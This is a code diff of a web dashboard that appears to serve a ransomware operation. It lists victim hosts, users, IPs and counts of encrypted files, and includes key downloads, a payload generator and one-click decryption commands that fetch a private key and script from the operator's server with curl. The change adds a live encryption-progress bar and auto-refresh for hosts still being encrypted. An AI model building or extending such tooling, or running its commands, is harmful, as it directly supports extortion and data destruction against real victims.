@@ -28,6 +28,11 @@ if ($search !== '') {
 $total_pages = max(1,(int)ceil($total_rows/$records_per_page));
 if ($pageno > $total_pages) $pageno = $total_pages;
 $rows = $data_stmt->fetchAll();
+// 是否有主机正在加密（用于自动刷新进度条）
+$has_active = false;
+foreach ($rows as $__r) {
+    if (isset($__r['is_complete']) && intval($__r['is_complete']) === 0) { $has_active = true; break; }
+}
 function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 $csrf = csrf_token();
 ?>
@@ -114,10 +119,10 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   <button type="submit"><i class="fas fa-search"></i></button>
 </form>
 <div class="table-wrap"><table>
-<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>文件类型</th><th>操作</th></tr></thead>
+<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>加密进度</th><th>文件类型</th><th>操作</th></tr></thead>
 <tbody>
 <?php if(empty($rows)):?>
-<tr><td colspan="10" class="empty">暂无受害主机数据</td></tr>
+<tr><td colspan="11" class="empty">暂无受害主机数据</td></tr>
 <?php else: foreach($rows as $i=>$row):
   $sm=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['machine_name']);
   $su=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['computer_user']);
@@ -134,6 +139,18 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   else $sz_str=$es.' B';
   $vid=$row['id'];
   $is_linux=(stripos($row['os']??'','linux')!==false||stripos($row['os']??'','darwin')!==false);
+  // ── 加密进度 ──
+  $tc=intval($row['total_count']??0);
+  $ts=intval($row['total_size']??0);
+  $ic=intval($row['is_complete']??1);
+  if($ts>0)$pct=(int)round($es*100/$ts);
+  elseif($tc>0)$pct=(int)round($ec*100/$tc);
+  else $pct=$ic?100:0;
+  $pct=max(0,min(100,$pct));
+  if($ts>=1073741824)$ts_str=round($ts/1073741824,2).' GB';
+  elseif($ts>=1048576)$ts_str=round($ts/1048576,2).' MB';
+  elseif($ts>=1024)$ts_str=round($ts/1024,2).' KB';
+  else $ts_str=$ts.' B';
 ?>
 <tr>
   <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
@@ -141,6 +158,18 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   <td><?=h($row['ip'])?></td><td><?=h($row['date'])?></td>
   <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail(<?=$vid?>,'<?=$ed?>')"><?=$ec?> 个</a></td>
   <td style="color:#4dc3fa"><?=$sz_str?></td>
+  <td style="min-width:150px">
+    <div style="display:flex;align-items:center;gap:8px">
+      <div style="flex:1;background:#1e293b;border-radius:6px;height:10px;overflow:hidden;min-width:78px">
+        <div style="height:10px;width:<?=$pct?>%;border-radius:6px;transition:width .6s;background:<?=$ic?'linear-gradient(90deg,#10b981,#34d399)':'linear-gradient(90deg,#f59e0b,#ef4444)'?>"></div>
+      </div>
+      <span style="font-size:.74rem;font-weight:600;color:<?=$ic?'#10b981':'#f59e0b'?>;white-space:nowrap;min-width:34px;text-align:right"><?=$pct?>%</span>
+    </div>
+    <div style="font-size:.68rem;color:#64748b;margin-top:3px;white-space:nowrap">
+      <?=$ec?>/<?=$tc>0?$tc:'?'?> 个 · <?=$sz_str?><?php if($ts>0):?> / <?=$ts_str?><?php endif;?>
+      <?php if(!$ic):?><span style="color:#f59e0b">● 加密中</span><?php else:?><span style="color:#10b981">✓ 完成</span><?php endif;?>
+    </div>
+  </td>
   <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
   <td style="white-space:nowrap">
     <?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
@@ -148,7 +177,7 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   </td>
 </tr>
 <?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
-<tr><td colspan="10" id="dec-row-<?=$vid?>" class="dec-expand">
+<tr><td colspan="11" id="dec-row-<?=$vid?>" class="dec-expand">
 <?php if($is_linux):?>
 <pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
 pip3 install -q cryptography 2>/dev/null
@@ -251,7 +280,7 @@ function showFileDetail(vid,jsonStr){
   var tr=null;for(var b of btns){if(b.onclick.toString().indexOf(vid+',' )>-1){tr=b.closest('tr');break;}}
   if(!tr)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
-  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';td.innerHTML=h;
+  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';td.innerHTML=h;
   nr.appendChild(td);tr.after(nr);_detOpen=nr;
 }
 
@@ -263,7 +292,7 @@ function showDecrypt(vid,ip,isLinux){
   var tr=document.querySelector('tr:has(button[onclick*="showDecrypt(\''+vid+'\'"])');
   if(!tr)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
-  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';
+  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
   if(isLinux){
     td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 (私钥AES加密传输)\nK="'+k+'"\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem.enc -o /tmp/.jke\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 -c "\nimport base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes\nfrom cryptography.hazmat.backends import default_backend\nraw=base64.b64decode(open(\\'/tmp/.jke\\').read())\niv,ct=raw[:16],raw[16:]\nc=Cipher(algorithms.AES(bytes.fromhex(\\'$K\\')),modes.CBC(iv),default_backend()).decryptor()\npt=c.update(ct)+c.finalize()\nopen(\\'/tmp/.jk\\',\\'wb\\').write(pt[:-pt[-1]])\n"\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>';
   }else{
@@ -338,6 +367,18 @@ function genPayload(){
     res.innerHTML=html;
   }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+e+'</div>';});
 }
+
+// ── 加密进度自动刷新 ──
+(function(){
+  var active = <?= $has_active ? 'true' : 'false' ?>;
+  if (!active) return;
+  // 顶部提示条
+  var bar=document.createElement('div');
+  bar.style.cssText='position:fixed;top:0;left:0;right:0;z-index:9999;background:linear-gradient(90deg,#f59e0b,#ef4444);color:#fff;font-size:.8rem;font-weight:600;text-align:center;padding:6px 12px;box-shadow:0 2px 8px rgba(0,0,0,.4)';
+  bar.innerHTML='<i class="fas fa-spinner fa-spin"></i> 有主机正在加密，进度条每 10 秒自动刷新…';
+  document.body.appendChild(bar);
+  setTimeout(function(){ location.reload(); }, 10000);
+})();
 </script>
 </body>
 </html>
